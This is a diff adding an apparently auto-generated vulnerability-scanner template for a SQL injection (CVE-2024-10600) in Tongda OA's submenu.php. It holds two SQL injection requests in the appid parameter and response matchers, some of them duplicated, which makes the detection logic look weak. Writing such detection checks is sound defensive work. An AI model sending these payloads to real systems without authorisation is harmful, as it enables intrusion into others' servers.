@@ -1,0 +1,37 @@
+id: cve-2024-10600
+info:
+  name: Tongda OA submenu.php SQL Injection (CVE-2024-10600)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection,CVE-2024-10600
+
+http:
+  - raw:
+      - |
+        GET /pda/appcenter/submenu.php?appid=1+and+1%3da HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "错误，请联系管理员"
+        part: body
+      - type: word
+        words:
+          - "错误，请联系管理员"
+        part: body
+
+  - raw:
+      - |
+        GET /pda/appcenter/submenu.php?appid=1+and+1%3d1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "用户未登录"
+        part: body
+      - type: word
+        words:
+          - "用户未登录"
+        part: body
